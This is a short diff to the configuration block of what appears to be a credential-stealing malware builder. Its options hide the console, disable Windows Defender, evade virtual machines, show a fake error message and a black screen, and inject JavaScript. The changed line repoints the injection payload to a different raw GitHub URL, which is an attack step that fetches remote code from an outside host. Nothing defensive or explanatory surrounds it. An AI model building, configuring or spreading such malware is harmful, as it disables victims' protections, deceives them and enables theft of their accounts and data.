@@ -37,7 +37,7 @@ config = {
     'Hide_Console': True,
     'Disable_defender': True,
     'inject': True,
-    'injection_url': 'https://raw.githubusercontent.com/j0taro/Oak-injection/main/Oak.js',
+    'injection_url': 'https://raw.githubusercontent.com/dreamyoak/Oak-injection/main/Oak.js',
     'Black_Screen': True,
     'Fake_error_message': True,
     'Antivm': True,
